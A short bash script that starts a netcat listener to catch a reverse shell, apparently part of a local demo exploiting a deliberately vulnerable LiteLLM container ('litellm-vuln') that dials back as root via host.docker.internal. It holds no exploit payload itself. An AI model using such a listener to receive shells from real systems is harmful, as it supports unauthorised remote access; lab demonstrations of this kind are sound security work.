#!/usr/bin/env bash
# Reverse-shell listener for the demo. Run this in its own terminal BEFORE the
# exploit. The container dials back to your Mac on this port via host.docker.internal.
PORT="${1:-4444}"
echo "[*] Listening for the reverse shell on 0.0.0.0:$PORT ..."
echo "    (leave this running; the shell will land here as root inside litellm-vuln)"
# macOS ships the BSD netcat, which has no -p; this invocation works on stock macOS.
exec nc -l "$PORT"
